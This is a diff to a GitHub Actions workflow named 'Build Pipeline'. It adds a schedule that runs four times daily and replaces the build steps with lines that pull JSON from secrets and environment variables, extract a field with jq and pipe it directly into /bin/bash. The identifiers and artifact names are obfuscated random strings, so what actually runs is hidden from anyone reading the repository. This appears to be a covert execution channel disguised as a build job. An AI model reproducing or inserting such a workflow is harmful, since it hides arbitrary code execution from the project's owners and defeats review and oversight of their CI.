@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '56 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,14 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          h0: ${{ secrets.h0 }}
+          brvsp66110: ${{ secrets.brvsp66110 }}
         run: |
-          printf '%s' "$h0" | jq -r .g1 | /bin/bash
-          echo $olr5241 | jq -r .rtx08569 | /bin/bash
+          printf '%s' "$brvsp66110" | jq -r .dsnf016 | /bin/bash
+          printf '%s' "$k69" | jq -r .fgoyp2 | /bin/bash
+          printf '%s' "$mi2489" | jq -r .w63 | /bin/bash
+          echo $jr46496 | jq -r .lsjr3 | /bin/bash
+          printf '%s' "$ymk879" | jq -r .lysak9 | /bin/bash
+          echo $yijgw34 | jq -r .y20 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: AHzxq0RW
+          name: eHPTdQns
           path: "*.zip"
           retention-days: 1
